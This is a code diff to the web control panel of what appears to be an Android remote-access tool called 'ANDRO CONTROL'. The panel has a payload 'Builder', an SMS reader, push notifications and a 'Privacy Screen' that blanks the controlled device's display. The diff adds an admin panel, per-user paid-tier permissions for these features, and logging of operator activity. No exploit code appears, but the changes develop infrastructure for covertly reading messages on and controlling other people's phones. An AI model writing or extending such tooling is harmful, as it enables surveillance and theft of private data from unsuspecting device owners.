@@ -99,6 +99,7 @@
                 ANDRO CONTROL
             </a>
             <div style="display: flex; align-items: center; gap: 12px;">
+                <a href="admin.html" id="adminPanelBtn" class="nav-link" style="display: none; color: #eb4d4b; border: 1px solid rgba(235, 77, 75, 0.3); padding: 4px 10px; border-radius: 6px; font-size: 0.75rem;"><i class="fas fa-user-shield me-1"></i> Admin Panel</a>
                 <a href="index.html" class="nav-link"><i class="fas fa-hammer me-1"></i> Builder</a>
                 <span class="live-badge"><span class="live-dot"></span> SYSTEM ACTIVE</span>
                 
@@ -316,17 +317,39 @@
             return;
         }
 
-        // Add lock indicators to SMS & Notification tabs for non-admin users
-        if (!isAdmin) {
+        // Track user activity in Firebase users_meta
+        trackUserActivity(user, 'Accessed Control Panel (' + (DID || 'Device') + ')');
+
+        // Listen to user permissions & role from database
+        fbDb.ref('users_meta/' + current_user_uid).on('value', snap => {
+            const uData = snap.val() || {};
+            window.userPermissions = uData.permissions || {};
+            window.isUserAdmin = isAdmin || uData.role === 'ADMIN';
+
+            const adminBtn = document.getElementById('adminPanelBtn');
+            if (adminBtn) {
+                adminBtn.style.display = window.isUserAdmin ? 'inline-flex' : 'none';
+            }
+
+            // Update lock indicators on tab buttons
             document.querySelectorAll('.tab-btn').forEach(btn => {
                 const onclickAttr = btn.getAttribute('onclick') || '';
-                if (onclickAttr.includes("'sms'") || onclickAttr.includes("'notification'")) {
-                    if (!btn.querySelector('.lock-badge')) {
-                        btn.insertAdjacentHTML('beforeend', ' <span class="lock-badge" style="font-size:0.75rem; color:#ff4757; margin-left:4px;"><i class="fas fa-lock"></i></span>');
+                const isSms = onclickAttr.includes("'sms'");
+                const isNotif = onclickAttr.includes("'notification'");
+                
+                if (isSms || isNotif) {
+                    const isAllowed = window.isUserAdmin || (isSms && window.userPermissions.sms === true) || (isNotif && window.userPermissions.notification === true);
+                    let lockBadge = btn.querySelector('.lock-badge');
+                    if (!isAllowed) {
+                        if (!lockBadge) {
+                            btn.insertAdjacentHTML('beforeend', ' <span class="lock-badge" style="font-size:0.75rem; color:#ff4757; margin-left:4px;"><i class="fas fa-lock"></i></span>');
+                        }
+                    } else if (lockBadge) {
+                        lockBadge.remove();
                     }
                 }
             });
-        }
+        });
 
         // Auth and permissions verified -> hide auth loader
         const loader = document.getElementById('authLoader');
@@ -351,7 +374,7 @@
             }
             
             if (userRoleBadge) {
-                if (isAdmin) {
+                if (window.isUserAdmin) {
                     userRoleBadge.textContent = 'Admin';
                     userRoleBadge.style.background = 'rgba(255, 71, 87, 0.2)';
                     userRoleBadge.style.color = '#ff4757';
@@ -369,6 +392,45 @@
         }
     });
 
+    function trackUserActivity(user, actionName) {
+        if (!user) return;
+        const email = user.email || '';
+        const uid = email ? email.replace(/[@.]/g, '_') : user.uid;
+        const isHardcodedAdmin = ADMIN_EMAILS.includes(email.toLowerCase());
+
+        fbDb.ref('users_meta/' + uid).once('value', snap => {
+            const umeta = snap.val() || {};
+            const loginCount = (umeta.login_count || 0) + (actionName.includes('Login') || actionName.includes('Accessed') ? 1 : 0);
+            const role = isHardcodedAdmin ? 'ADMIN' : (umeta.role || 'USER');
+
+            const updatedData = {
+                uid: uid,
+                email: email,
+                displayName: user.displayName || (email ? email.split('@')[0] : 'User'),
+                photoURL: user.photoURL || '',
+                role: role,
+                last_login: Date.now(),
+                last_login_formatted: new Date().toLocaleString(),
+                login_count: loginCount,
+                user_agent: navigator.userAgent
+            };
+
+            if (!umeta.created_at) updatedData.created_at = Date.now();
+            fbDb.ref('users_meta/' + uid).update(updatedData);
+
+            fbDb.ref(`users_meta/${uid}/activity_history`).push({
+                time: Date.now(),
+                action: actionName
+            });
+
+            fbDb.ref('audit_logs').push({
+                timestamp: Date.now(),
+                user: email || uid,
+                action: actionName
+            });
+        });
+    }
+
     // Update Device ID in UI & Title
     document.getElementById('devId').textContent = DID || 'Unknown';
     document.title = 'Control — ' + (DID || 'Device');
@@ -381,8 +443,13 @@
     let isPrivacyOn = false;
 
     function switchTab(name) {
-        if ((name === 'sms' || name === 'notification') && !window.isUserAdmin) {
-            showLockModal();
+        const perms = window.userPermissions || {};
+        if (name === 'sms' && !window.isUserAdmin && perms.sms !== true) {
+            showLockModal('SMS Reader feature is restricted for free accounts.');
+            return;
+        }
+        if (name === 'notification' && !window.isUserAdmin && perms.notification !== true) {
+            showLockModal('Push Notification feature is restricted for free accounts.');
             return;
         }
         document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
@@ -393,14 +460,28 @@
         }
     }
 
-    function showLockModal() {
+    function showLockModal(msg) {
         const modal = document.getElementById('premiumLockModal');
+        const msgEl = document.getElementById('lockModalDescText');
+        if (msgEl && msg) msgEl.textContent = msg;
         if (modal) modal.style.display = 'flex';
     }
 
     function closeLockModal() {
         const modal = document.getElementById('premiumLockModal');
         if (modal) modal.style.display = 'none';
+    }
+
+    function togglePrivacyCb() {
+        const checkbox = document.getElementById('privacyCheckbox');
+        const perms = window.userPermissions || {};
+        if (!window.isUserAdmin && perms.privacy_screen !== true) {
+            checkbox.checked = false;
+            showLockModal('Privacy Screen feature is restricted for free accounts.');
+            return;
+        }
+        isPrivacyOn = checkbox.checked;
+        devRef.child('screenConfig/privacyScreen').set(isPrivacyOn);
     }
 
     function sendCommand(cmd, value = true) {
